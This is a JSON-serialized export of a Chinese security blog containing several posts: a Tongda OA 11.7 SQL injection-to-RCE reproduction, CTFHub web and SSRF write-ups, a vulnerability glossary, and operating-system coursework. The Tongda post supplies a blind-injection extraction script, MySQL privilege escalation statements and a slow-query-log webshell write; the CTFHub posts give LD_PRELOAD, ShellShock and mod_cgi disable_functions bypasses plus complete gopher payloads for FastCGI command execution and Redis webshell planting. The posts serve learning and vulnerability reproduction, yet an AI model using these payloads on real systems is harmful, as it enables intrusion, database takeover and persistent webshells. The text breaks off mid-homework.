http://47.95.201.153/blog/AWD攻防线下生存之道.html\nCTF AWD模式攻防Note: https://www.cnblogs.com/nul1/p/9576386.html\n\n权限维持\n不死马的删除: https://yq.aliyun.com/zt/325638\nawd攻防之kill不死马: https://www.jianshu.com/p/ba79686987da\npython中的后渗透|也可用于AWD攻防–shell管理: https://www.jianshu.com/p/2e8e7330b73e\n从0到1掌握AWD攻防之RSA必杀: https://www.360zhijia.com/anquan/456324.html\n资深大牛教你如何web端权限维持（内附具体步骤）: http://www.sohu.com/a/127074604_472906\n\n","slug":"CTF之AWD学习","date":"2020-09-29T12:12:16.000Z","categories_index":"CTF","tags_index":"CTF,AWD","author_index":"A1andNS"},{"id":"8e117461a44b784c60f14a08fb600518","title":"通达OA11.7后台sql注入到RCE复现","content":"写在最前最近的Hvv期间爆出来一个通达OA的漏洞,红队大佬们太牛了.然后在网上看到了相关的一些文章,下面就实际来复现一下 \n复现环境\n漏洞版本:通达OA11.7\n靶机系统:Winodws 7\n\n漏洞详情这里想要看源码,和之前复现通达OA漏洞一样的,需要去找一个解码工具,才可以看到源代码.上次用到了一个叫Zend解密工具.\n下面看存在漏洞的代码:\nWindows平台下:C://MYOA/webroot/general/hr/manage/query/delete_cascade.php\n\n这里首先会先判断变量$condition_cascade时候为空,如果部位空就把变量内容中的&#39;替换为&#39; ,这里的代码可以看出来,没有对传递的参数做任何过滤,所以它存在sql注入的.\n这里是删除的功能,而且是无回显示机制,是盲注,所以可以试一下注入语句.\n(select 1 from (select sleep(5))a),结果当然没有一帆风顺.\n\n报了一个不安全的SQL语句,应该是触发了过滤机制了,过滤代码在/inc/conn.php中,如下图所示:\n\n$clean .= substr($db_string, $old_pos);\n$clean = trim(strtolower(preg_replace(array(\"/\\s+/s\"), array(\" \"), $clean)));\n$fail = false;\n$matches = array();\nif ((2 &lt; strpos($clean, \"/*\")) || (strpos($clean, \"--\") !== false) || (strpos($clean, \"#\") !== false)) &#123;\n\t$fail = true;\n\t$error = _(\"注释代码\");\n&#125;\nelse if (preg_match(\"/(^|[^a-z])union(\\s+[a-z]*)*\\s+select($|[^[a-z])/s\", $clean) != 0) &#123;\n\t$fail = true;\n\t$error = _(\"联合查询\");\n&#125;\nelse if (preg_match(\"/(^|[^a-z])(sleep|benchmark|load_file|mid|ord|ascii|extractvalue|updatexml|exp|current_user)\\s*\\(/s\", $clean, $matches) != 0) &#123;\n\t$fail = true;\n\t$error = $matches[2];\n&#125;\nelse if (preg_match(\"/(^|[^a-z])into\\s+outfile($|[^[a-z])/s\", $clean) != 0) &#123;\n\t$fail = true;\n\t$error = _(\"生成文件\");\n&#125;\nelse if (preg_match(\"/.*update.+user.+set.+file_priv.*/s\", $clean) != 0) &#123;\n\t$fail = true;\n\t$error = \"set file_priv\";\n&#125;\nelse if (preg_match(\"/.*case.+when.+then.+end.*/s\", $clean) != 0) &#123;\n\t$fail = true;\n\t$error = \"case when\";\n&#125;\nelse if (preg_match(\"/.*set.+general_log.*/s\", $clean) != 0) &#123;\n\t$fail = true;\n\t$error = \"general_log\";\n&#125;\n\nif ($fail) &#123;\n\techo _(\"不安全的SQL语句：\") . $error . \"&lt;br />\";\n\techo td_htmlspecialchars($db_string);\n\texit();\n&#125;\n\n在第二个else if模块中可以看到sleep()被过滤了,还有其他的一些函数被过滤了例如ascii(),ord()等函数.\n但是还是能够注入的,盲注中常见的substr和if函数都没有被过滤,所以这事就是一个机会了.用一些报错函数来作为判断依据.\npayload:\n?condition_cascade&#x3D;select if((substr(database(),1,1)&#x3D;&#39;a&#39;),1,power(9999,9999))\n\n当字符相等,不会报错,当字符不相等,就会报错.\n\n\nimport requests\n\ncookies = &#123;\"Cookie\": \"KEY_RANDOMDATA=5256; PHPSESSID=fi7u0tsiutbj4emr7uiag4qhv1; SID_1=84a85250\"&#125;\nurl = \"http://192.168.90.128/general/hr/manage/query/delete_cascade.php\"\nls = []\nresult = \"result is: \"\nfor i in range(33, 127):\n    ls.append(chr(i))\nprint(ls)\nfor i in range(1, 20):\n    for j in ls:\n        payload = '?condition_cascade=select+if((substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,1),&#123;0&#125;,1)=\\'&#123;1&#125;\\'),1,power(9999,99))'.format(i, j)\n        new_url = url+payload\n        print(new_url)\n        r = requests.get(new_url, cookies=cookies)\n        if \"错误\" not in r.text:\n            result += j\n            print(result)\n            continue\nprint(result)\n\ngetshell通达OA的myasql用户是root用户,所以权限比较高,可以通过添加一个新用户,来让这个新的用户可以任意地址登陆.\ngrant all privileges ON mysql.* TO &#39;a1an&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION\n\n然后还要flush privileges,才能使配置生效.然后添加的这个用户是对maysq数据库拥有所有权限的,接下来就要去连接数据库\n,然后给自己加权限:\n\nUPDATE &#96;mysql&#96;.&#96;user&#96; SET &#96;Password&#96; &#x3D; &#39;*DE0742FA79F6754E99FDB9C8D2911226A5A9051D&#39;, &#96;Select_priv&#96; &#x3D; &#39;Y&#39;, &#96;Insert_priv&#96; &#x3D; &#39;Y&#39;, &#96;Update_priv&#96; &#x3D; &#39;Y&#39;, &#96;Delete_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_priv&#96; &#x3D; &#39;Y&#39;, &#96;Drop_priv&#96; &#x3D; &#39;Y&#39;, &#96;Reload_priv&#96; &#x3D; &#39;Y&#39;, &#96;Shutdown_priv&#96; &#x3D; &#39;Y&#39;, &#96;Process_priv&#96; &#x3D; &#39;Y&#39;, &#96;File_priv&#96; &#x3D; &#39;Y&#39;, &#96;Grant_priv&#96; &#x3D; &#39;Y&#39;, &#96;References_priv&#96; &#x3D; &#39;Y&#39;, &#96;Index_priv&#96; &#x3D; &#39;Y&#39;, &#96;Alter_priv&#96; &#x3D; &#39;Y&#39;, &#96;Show_db_priv&#96; &#x3D; &#39;Y&#39;, &#96;Super_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_tmp_table_priv&#96; &#x3D; &#39;Y&#39;, &#96;Lock_tables_priv&#96; &#x3D; &#39;Y&#39;, &#96;Execute_priv&#96; &#x3D; &#39;Y&#39;, &#96;Repl_slave_priv&#96; &#x3D; &#39;Y&#39;, &#96;Repl_client_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_view_priv&#96; &#x3D; &#39;Y&#39;, &#96;Show_view_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_routine_priv&#96; &#x3D; &#39;Y&#39;, &#96;Alter_routine_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_user_priv&#96; &#x3D; &#39;Y&#39;, &#96;Event_priv&#96; &#x3D; &#39;Y&#39;, &#96;Trigger_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_tablespace_priv&#96; &#x3D; &#39;Y&#39;, &#96;ssl_type&#96; &#x3D; &#39;&#39;, &#96;ssl_cipher&#96; &#x3D; &#39;&#39;, &#96;x509_issuer&#96; &#x3D; &#39;&#39;, &#96;x509_subject&#96; &#x3D; &#39;&#39;, &#96;max_questions&#96; &#x3D; 0, &#96;max_updates&#96; &#x3D; 0, &#96;max_connections&#96; &#x3D; 0, &#96;max_user_connections&#96; &#x3D; 0, &#96;plugin&#96; &#x3D; &#39;mysql_native_password&#39;, &#96;authentication_string&#96; &#x3D; &#39;&#39;, &#96;password_expired&#96; &#x3D; &#39;Y&#39; WHERE &#96;Host&#96; &#x3D; Cast(&#39;%&#39; AS Binary(1)) AND &#96;User&#96; &#x3D; Cast(&#39;a1an&#39; AS Binary(4));\n\n\n下面从注入点刷新权限.\n?condition_cacade&#x3D;flush privileges;\n\n接下来重新登陆,遇到了登陆不了的问题,还好大佬说明了这个情况如何解决,只要再次执行:\ngrant all privileges ON mysql.* TO 'a1an'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION\n\n就好了,接下来继续:\nselect @@basedir;查一下路径.\n\n所以通达OA的web目录了就是C:/MYOA/webroot,下面写shell\nset global slow_query_log=on;set global slow_query_log_file='c:/MYOA/webroot/a1andns.php';select '&lt;?php eval($_POST['cmd']);?>' or sleep(11);\n\n\n下面就用antsword去连接一下\n\n成功连接上了webshell.所以如果利用该漏洞攻击者可以植入websheell,读取数据库数据等操作.\n参考资料[1]. https://www.77169.net/html/267833.html\n[2]. https://www.anquanke.com/post/id/218407\n","slug":"通达OA11-7后台sql注入到RCE复现","date":"2020-09-26T12:15:21.000Z","categories_index":"漏洞复现","tags_index":"漏洞复现,漏洞分析,RCE,代码审计,SQL,通达OA","author_index":"A1andNS"},{"id":"a03591ba90db85acdb8cd060417faa18","title":"CTFHUB技能树WEB进阶","content":"LD_PRELOADLD_PRELOAD，是个环境变量，用于动态库的加载，动态库加载的优先级最高，一般情况下，其加载顺序为LD_PRELOAD&gt;LD_LIBRARY_PATH&gt;/etc/ld.so.cache&gt;/lib&gt;/usr/lib。应该比较接近windows下的DLL文件。\n打开环境,提示用蚁剑去连接.\n看到了根目录的/flag但是问题是看不了.\n这里是要我们利用LD_PRELOAD来绕过disable_function限制\n写一个C脚本：\n#include&lt;stdio.h>\n#include&lt;stdlib.h>\n#include&lt;unistd.h>\n\n__attribute__((__constructor__))void angel(void)\n&#123;\n    unsetenv(\"LD_PRELOAD\");\n    system(\"/readflag > /tmp/a1andns\");\n&#125;\n\n编译成hack.so文件\ngcc -shared -fPIC -o hack.so\n把他上传到tmp目录下，这个看心情随意。\n在web根目录下新建一个php文件\n&lt;?php \nputenv(\"LD_PRELOAD=/tmp/hack.so\");\nerror_log(\"\",1,\"\",\"\");\n?>\n\n然后去url处包含一下这个文件，?ant=include(&#39;alan.php&#39;);就可以去tmp/a1andns查看flag了。\nctfhub{5ceaed2cf789580e632a42cb4ef074388fc8473a}\nShellShockbash破壳漏洞,蚁剑连接上去，和上一题一样不能执行命令。\n直接用蚁剑写一个php文件到web根目录。\n&lt;?php\n    @eval($_REQUEST['ant']);\n    putenv(\"PHP_test=() &#123; :; &#125;; tac /flag >> /var/www/html/a1andns\");\n    error_log(\"admin\",1);\n?>\n\n然后用浏览器访问http://challenge-ac75bd92279208e8.sandbox.ctfhub.com:10080/alan.php\n返回蚁剑中查看a1andns就可以得到flag\n\nctfhub&#123;270264686ebc48d07b8ec5dbc5a6082b533c790c&#125;\n\napache mode cgi这里要用到两个文件一个是.htaccess，一个是mod_cgi\n关于mod_cgi，任何具有MIME类型applicant/x-http-cgi或者被cgi-script处理器处理的文件都被作为CGI脚本对待，并且由服务器来执行，然后把输出返回给客户端。可以通过两种途径使文件称为CGI脚本，一种是文件具有AddType指令定义的拓展名，另一个是文件位于ScriptAlias目录中。\n通过修改或创建.htaccess文件来利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。\n先用蚁剑连接上后门，然后上传一个.htaccess文件和一个shell.alan文件\n.htaccess:\nOptions +ExecCGI\nAddHandler cgi-script .alan\n\nshell.alan:\n#!/bin/sh\necho \"Hello,A1andNS!!!\\n\";cd \"/\"&amp;&amp;./readflag\n\n这里有一个坑点，必须要记得给shell.alan加运行权限，不然到时候服务器就会报错。\n?ant=chmod(&quot;shell.alan&quot;,0777);\n","slug":"CTFHUB技能树WEB进阶","date":"2020-09-24T08:57:34.000Z","categories_index":"CTF","tags_index":"CTF,WEB","author_index":"A1andNS"},{"id":"16c3496fc2f40d1a9d04f017d5e5a1b7","title":"计算机相关知识补全-持续更新","content":"应用组件ImageMagickImageMagick图片处理是一套功能强大、稳定而且免费的工具集和开发包，可以用来读、写和处理超过90种的图片文件，包括流行的TIFF、JPEG、GIF、 PNG、PDF以及PhotoCD等格式。利用ImageMagick，你可以根据web应用程序的需要动态生成图片, 还可以对一个（或一组）图片进行改变大小、旋转、锐化、减色或增加特效等操作，并将操作的结果以相同格式或其它格式保存，对图片的操作，即可以通过命令行进行。开源软件\nZabbixZabbix 是由 Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。可用于监视各种网络服务、服务器和网络机器等状态。\nNexus RepositoryNexus Repository 是一个开源的仓库管理系统，在安装、配置、使用简单的基础上提供了更加丰富的功能。\nIBM WebSphere Application ServerIBM WebSphere Application Server是美国IBM公司的一款应用服务器产品。\nD-Link ShareCenter DNS-320D-Link ShareCenter DNS-320是台湾友讯集团的一款千兆网络存储器。\nD-Link ShareCenter DNS-325D-Link ShareCenter DNS-325是台湾友讯集团的一款网络存储设备。\n漏洞魔图漏洞黑客可以通过漏洞上传一张带有木马的图片，写入新的命令，从而攻击后台服务器，甚至可能带来删除用户数据、停止网络服务等问题，会对服务器厂商和用户造成巨大的损失和麻烦。\n破壳漏洞“破壳”是一个严重漏洞的别名，在Red Hat、CentOS、Ubuntu 、Fedora 、Amazon Linux 、OS X 10.10中均拥有存在CVE-2014-6271（即“破壳”漏洞）漏洞的Bash版本，同时由于Bash在各主流操作系统的广泛应用，此漏洞的影响范围包括但不限于大多数应用Bash的Unix、Linux、Mac OS X，而针对这些操作系统管理下的数据均存在高危威胁。\n#检测方法\nbash --version\nenv x='() &#123; :;&#125;; echo shellshocked' bash –c \"echo test\"","slug":"计算机相关知识补全-持续更新","date":"2020-09-24T07:55:31.000Z","categories_index":"学习笔记","tags_index":"扫盲","author_index":"A1andNS"},{"id":"c21309bde02094523c3bada7d46c6a98","title":"CTFHUB技能树SSRF练习","content":"ssrf-内网访问http://challenge-5446eda4d5e3ebf6.sandbox.ctfhub.com:10080/?url=127.0.0.1/flag.php\n得到flag：ctfhub{23a8ea61e8bc1f0a6e40a121491b4c78f7487b7b}\nssrf-伪协议读取文件直接访问是不行的\n\n试一下file://协议\n?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php\n\n\nssrf-端口扫描根据提示端口是8000-9000\nfile:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php\n\n得到php源码：\n&lt;?php\n    error_reporting(0);\nif (!isset($_REQUEST['url']))&#123;\n    header(\"Location: /?url=_\");   \n    exit;\n&#125;\nheader(\"Tips: Port = [8000,9000)\");\n$ch = curl_init();\ncurl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_exec($ch);\ncurl_close($ch);\n?>\n\n生成一个字典结合burp去爆破一下\n\n\nssrf-POST请求题目提示看302.php,那就先看一下302.php文件都写了什么吧。\nPHP1&lt;?php2if(isset($_GET['url']))&#123;3   header(\"Location: &#123;$_GET['url']&#125;\");4   exit;5&#125;67highlight_file(__FILE__);\n\nindex.php的源码：\n&lt;?php\n      error_reporting(0);\nheader(\"Help: here is 302.php\");\nif (!isset($_REQUEST['url']))&#123;\n    header(\"Location: /?url=_\");\n    exit;&#125;\n$ch = curl_init();\ncurl_setopt($ch,CURLOPT_URL,$_REQUEST['url']);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\ncurl_exec($ch);curl_close($ch);\n\nflag.php源码：\n&lt;?php\n    error_reporting(0);\n\tif($_SERVER[\"REMOTE_ADDR\"] != \"127.0.0.1\")&#123;\n        echo \"Just View From 127.0.0.1\";\n    \treturn;&#125;\n\t$flag=getenv(\"CTFHUB\");\n\t$key = md5($flag);\n\tif(isset($_POST[\"key\"]) &amp;&amp; $_POST[\"key\"] == $key)&#123;\n        echo $flag;\n        exit;\n    &#125;\n?>\n&lt;!-- Debug: key=&lt;?php echo $key;?>-->\n\n编码3次，因为有三层，然后注意一点：第一次url编码后%0A要改为%0D%0A才能继续进行url编码。\nurl构造后：\nPOST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D396fe92a21a3c4342d09b42b5fb46350\n\npayload\ngopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D396fe92a21a3c4342d09b42b5fb46350\n\n得到flag：ctfhub{924f902c858d525b6c03f5e39b3d5a17ff501dc1}\nssrf-上传文件在flag.php添加一个submit按钮，\nburp抓包修改，然后进行url编码，最后用gopher协议去打，和上面的post请求流程类似。然后就可以得到flag。\nssrf-FastCGI协议index.php：\n\n&lt;?php\n\nerror_reporting(0);\n\nif (!isset($_REQUEST['url']))&#123;\n    header(\"Location: /?url=_\");\n    exit;\n&#125;\n\nheader(\"Help: here is 302.php\");\n\n$ch = curl_init();\ncurl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\ncurl_exec($ch);\ncurl_close($ch);\n\n302.php:\n&lt;?php\nif(isset($_GET['url']))&#123;\n    header(\"Location: &#123;$_GET['url']&#125;\");\n    exit;\n&#125;\n\nhighlight_file(__FILE__);\n\n用gopherus来生成payload来打，这里生成的还要手动去url编码两次，然后命令执行：\ngopherus --exploit fastcgi\n\n\n\npayload:\ngopher%253A%252F%252F127.0.0.1%253A9000%252F_%252501%252501%252500%252501%252500%252508%252500%252500%252500%252501%252500%252500%252500%252500%252500%252500%252501%252504%252500%252501%252501%252502%252502%252500%25250F%252510SERVER_SOFTWAREgo%252520%252F%252520fcgiclient%252520%25250B%252509REMOTE_ADDR127.0.0.1%25250F%252508SERVER_PROTOCOLHTTP%252F1.1%25250E%252502CONTENT_LENGTH94%25250E%252504REQUEST_METHODPOST%252509KPHP_VALUEallow_url_include%252520%25253D%252520On%25250Adisable_functions%252520%25253D%252520%25250Aauto_prepend_file%252520%25253D%252520php%25253A%252F%252Finput%25250F%252515SCRIPT_FILENAME%252Fvar%252Fwww%252Fhtml%252F302.php%25250D%252501DOCUMENT_ROOT%252F%252500%252500%252501%252504%252500%252501%252500%252500%252500%252500%252501%252505%252500%252501%252500%25255E%252504%252500%25253C%25253Fphp%252520system%252528%252527cat%252520%252Fflag_e4100679f0c9b85505aa091cf90c2075%252527%252529%25253Bdie%252528%252527-----Made-by-SpyD3r-----%25250A%252527%252529%25253B%25253F%25253E%252500%252500%252500%252500\n\n\nctfhub{19d66ea175a12de95552deebcc0ecb6e8637ff5c}\nssrf-redis一样用Gopherus去打。\ngopherus --exploit redis\n\nindex.php源码：\nerror_reporting(0);\n\nif (!isset($_REQUEST['url']))&#123;\n    header(\"Location: /?url=_\");\n    exit;\n&#125;\n\nheader(\"Help: here is 302.php\");\n\n$ch = curl_init();\ncurl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\ncurl_exec($ch);\ncurl_close($ch);\n\n一直报gateway time-out，原来是gopher前面漏加上_\npayload:\n_gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A\n\nctfhub{d74821c3626b10cd51c80ceb37d0be4b433e59f4}\nssrf-url-bypass直接bypass：\n?url&#x3D;http:&#x2F;&#x2F;notfound.ctfhub.com@127.0.0.1&#x2F;flag.php\n\nssft-数字IP bypass直接用localhost访问\n?url&#x3D;localhost&#x2F;flag.php\n\nctfhub{48bb1c96af1b0c35246f5ce895566b27e5ce1e40}\nssrf-302跳转bypass这题好像出现非预期了，直接?url=127.0.0.1/flag.php就可以得到flag。\nindex.php:\n\n&lt;?php\n\nerror_reporting(0);\n\nif (!isset($_REQUEST['url'])) &#123;\n    header(\"Location: /?url=_\");\n    exit;\n&#125;\n\n$url = $_REQUEST['url'];\n\n// Custom Domain...\n// if (preg_match(\"/\\d/\", $url)) &#123;\n//     exit(\"hacker! Ban '/\\d/'\");\n// &#125;\n\n$ip = gethostbyname(parse_url($url, PHP_URL_HOST));\nif (preg_match(\"/127|172|10|192\", $ip)) &#123;\n    exit(\"hacker! Ban Intranet IP\");\n&#125;\n\n$ch = curl_init();\ncurl_setopt($ch, CURLOPT_URL, $url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\ncurl_exec($ch);\ncurl_close($ch);\n\n奇怪的地方是明明这里对127做了正则匹配啊。\nflag.php:\n&lt;?php\n\nerror_reporting(0);\n\nif ($_SERVER[\"REMOTE_ADDR\"] != \"127.0.0.1\") &#123;\n    echo \"Just View From 127.0.0.1\";\n    exit;\n&#125;\n\necho getenv(\"CTFHUB\");\n\nssrf-DNS重绑定 bypass这题感觉又是非预期了\nindex.php:\n\n&lt;?php\n\nerror_reporting(0);\n\nif (!isset($_REQUEST['url'])) &#123;\n    header(\"Location: /?url=_\");\n    exit;\n&#125;\n\n$url = $_REQUEST['url'];\n\n$ip = gethostbyname(parse_url($url, PHP_URL_HOST));\nif (preg_match(\"/127|172|10|192\", $ip)) &#123;\n    exit(\"hacker! Ban Intranet IP\");\n&#125;\n\n$ch = curl_init();\ncurl_setopt($ch, CURLOPT_URL, $url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_exec($ch);\ncurl_close($ch);\n?>\n\nflag.php:\n\n&lt;?php\n\nerror_reporting(0);\n\nif ($_SERVER[\"REMOTE_ADDR\"] != \"127.0.0.1\") &#123;\n    echo \"Just View From 127.0.0.1\";\n    exit;\n&#125;\n\necho getenv(\"CTFHUB\");\n\n\n本地DNS(etc/resolv.conf)\nsearch default.svc.cluster.local svc.cluster.local cluster.local\nnameserver 100.100.2.136\nnameserver 100.100.2.138\noptions ndots:5\n\n","slug":"CTFHUB技能树SSRF练习","date":"2020-09-21T09:13:38.000Z","categories_index":"CTF","tags_index":"CTF,WEB","author_index":"A1andNS"},{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"系统调用函数来控制进程，UNIX系统采用了一对系统调用来创建新进程：fork()、exec()，并且还可以通过另一个系统调用wait()来等待其创建的子进程完成执行。\nfork()系统调用system uses fork() system call to creat a new process. \n#include&lt;stdio.h>\n#include&lt;stdlib.h>\n#include&lt;unistd.h>\n\nint main(int args, char *argv[])\n&#123;\n    printf(\"Hello world (pid:%d)\\n\", (int)getpid());\n    int rc = fork();\n    if ( rc&lt;0 )\n    &#123;\n        fprintf(stderr, \"fork failed\\n\");\n        exit(1);\n    &#125;\n    else if (rc == 0)\n    &#123;\n        printf(\"Hello, I am child (pid:%d)\\n\",(int)getpid());\n    &#125;\n    else\n    &#123;\n        printf(\"Hello, I am parent of %d (pid:%d)\\n\", rc, (int)getpid());\n    &#125;\n    return 0;   \n&#125;\n\n运行结果：\na1andns@a1andns-PC:~/Desktop/C++ Program$ ./p1\nHello world (pid:13940)\nHello, I am parent of 13941 (pid:13940)\nHello, I am child (pid:13941)\n\n一开始运行的时候创建了一个进程PID为13940的进程。然后程序到了int rc = fork()，吊用了fork()系统调用，这样将会创建一个新的进程，而新创建的进程机会和调用进程完全一样，对于操作系统来说，这时看起来就有两个完全一样的p1程序在运行，而且返回都是通过fork()来实现。fork的进程就是子进程了，原来的进程就是父进程。子进程不会从main()开始执行了，而是直接从fork()处返回。\n子进程和父进程还是有区别的，它拥有自己的地址空间、寄存器、程序计数器等等，但是子进程从fork返回的值是0,而父进程从fork返回的值是创建的子进程的PID。\n但是不一定都会是以上的运行结果，上面的是父进程先运行并且输出了信息，但是在某些情况下也可能由子进程先运行，会有下面的结果：\na1andns@a1andns-PC:~/Desktop/C++ Program$ ./p1\nHello world (pid:13940)\nHello, I am child (pid:13941)\nHello, I am parent of 13941 (pid:13940)\n\n这是CPU调度程序决定的，CPU调用程序决定了某个时候哪个进程被执行。\nwait()系统调用父进程调用wait()来延迟自己的执行，直到子进程执行完毕，wait()才会返回父进程。\nexec()系统调用当想要运行不同程序于子程序中，那就会就用到exec()系统调用了。exec()会从可执行程序中加载代码和静态数据，并且用它来覆写自己的代码段，堆栈以及其他内存空间也会被重新初始化。所以它并没有创建新程序，而是直接将当前运行的程序替换为不同的运行程序。子进程执行exec后，几乎和p3.c程序没有运行过一样，对exec的成功调用不会返回。\nUNIX系统的shell就是一个例子，通过fork()和exec()结合来创建一个子进程并且执行相应代码，然后使用wait()函数来确保子进程的先运行，等到子进程运行完毕就会返回到shell的提示符，等待用户输入下一条命令。\nHomework(1)编写一个调用fork()程序。在调用fork()之前，让主程序访问一个变量(例如 x)并将其值设置为某个值，观察情况#include&lt;stdio.h>\n#include&lt;stdlib.h>\n#include&lt;unistd.h>\n#include&lt;string.h>\n#include&lt;fcntl.h>\n#include&lt;sys/wait.h>\n\nint main(int argc, char *argv[])\n&#123;\n    printf(\"hello world(pid:%d)\\n\", (int)getpid());\n    int x = 100;\n    printf(\"the number is %d\\n\", x);\n    int rc = fork();\n    if (rc &lt; 0 )\n    &#123;\n        fprintf(stderr,\"fork failed\\n\");\n        exit(1);\n    &#125;else if (rc == 0)&#123;\n        printf(\"hello, I am child (pid:%d)\\n\", (int)getpid());\n        x += 10;\n        printf(\"the number is %d\\n\", x);\n    &#125;\n    else\n    &#123;\n        int wc = wait(NULL);\n        x += 20;\n        printf(\"hello, I am parent of %d (wc:%d) (pid:%d)\\n\", rc , wc, (int) getpid());\n        printf(\"the number is %d\\n\", x);\n    &#125;\n    return 0;\n&#125;\n\n运行结果：\na1andns@a1andns-PC:~/Desktop/C++ Program$ ./unit5h1\nhello world(pid:32676)\nthe number is 100\nhello, I am child (pid:32677)\nthe number is 110\nhello, I am parent of 32677 (wc:32677) (pid:32676)\nthe number is 120\n\n","slug":"操作系统之进程API","date":"2020-09-20T13:44:15.000Z","categories_index":"操作系统","tags_index":"操作系统,C","author_index":"A1andNS"},{"id":"53e6dede4a08a86369937a2c59d15b83","title":"Operating System Homework(1)","content":"This is a homework about cpu-intro, you can get the source from https://github.com/remzi-arpacidusseau/ostep-homework/blob/master/cpu-intro/\nThe homework is from the book named “Operating System” and the book is written by Remzi H.Arpaci-Dusseau and Andrea C.Arpaci-Dusseau.\nnow let’s download the source from the github repositories.\nHelp is herea1andns@a1andns-PC:~/Documents/Course Doc/Python/Operating System$ python3 process-run.py -h\nUsage: process-run.py [options]\n\nOptions:\n  -h, --help            show this help message and exit\n  -s SEED, --seed=SEED  the random seed\n  -P PROGRAM, --program=PROGRAM\n                        more specific controls over programs\n  -l PROCESS_LIST, --processlist=PROCESS_LIST\n                        a comma-separated list of processes to run, in the\n                        form X1:Y1,X2:Y2,... where X is the number of\n                        instructions that process should run, and Y the\n                        chances (from 0 to 100) that an instruction will use\n                        the CPU or issue an IO\n  -L IO_LENGTH, --iolength=IO_LENGTH\n                        how long an IO takes\n  -S PROCESS_SWITCH_BEHAVIOR, --switch=PROCESS_SWITCH_BEHAVIOR\n                        when to switch between processes: SWITCH_ON_IO,\n                        SWITCH_ON_END\n  -I IO_DONE_BEHAVIOR, --iodone=IO_DONE_BEHAVIOR\n                        type of behavior when IO ends: IO_RUN_LATER,\n                        IO_RUN_IMMEDIATE\n  -c                    compute answers for me\n  -p, --printstats      print statistics at end; only useful with -c flag\n                        (otherwise stats are not printed)\n\n\nHomework begin(1) Use this statement to run the program：./process-run.py -l 5:100,5:100Here, the process we specified is “5:100” which means it should consist of 5 instructions, and the chances that each instruction is a CPU instruction are 100%. And “X:Y,X:Y” where X is the number of instructions and Y is the percent change that an instruction is CPU not IO.\na1andns@a1andns-PC:~/Documents/Course Doc/Python/Operating System$ python3 process-run.py -l 5:100,5:100\nProduce a trace of what would happen when you run these processes:\nProcess 0\n  cpu\n  cpu\n  cpu\n  cpu\n  cpu\n\nProcess 1\n  cpu\n  cpu\n  cpu\n  cpu\n  cpu\n\nImportant behaviors:\n  System will switch whenthe current process is FINISHED or ISSUES AN IO\n  After IOs, the process issuing the IO willrun LATER (when it is its turn)\n  \na1andns@a1andns-PC:~/Documents/Course Doc/Python/Operating System$ python3 process-run.py -c -l 5:100,5:100\nTime    PID: 0    PID: 1       CPU       IOs\n  1    RUN:cpu     READY         1          \n  2    RUN:cpu     READY         1          \n  3    RUN:cpu     READY         1          \n  4    RUN:cpu     READY         1          \n  5    RUN:cpu     READY         1          \n  6       DONE   RUN:cpu         1          \n  7       DONE   RUN:cpu         1          \n  8       DONE   RUN:cpu         1          \n  9       DONE   RUN:cpu         1          \n 10       DONE   RUN:cpu         1          \n\nProcess 1 is in READY state when the process 0 is running, and the process 0 run 5 instructions. When process 0 is finished,  the CPU run the process 1 to perform the same operation. The total time is 10 units of time.\n(2)Use this statement to run the program: ./process-run.py -l 4:100,1:0this means CPU should run 4 instructions in process 0, then process 1 issues an I/O request, the CPU blocks the process, I/O executes for 4 units of time, the CPU releases the blocked state of process 1, and process 1 completes the operation, which takes 10 units of time.\na1andns@a1andns-PC:~/Documents/Course Doc/Python/Operating System$ python3 process-run.py -l 4:100,1:0\nProduce a trace of what would happen when you run these processes:\nProcess 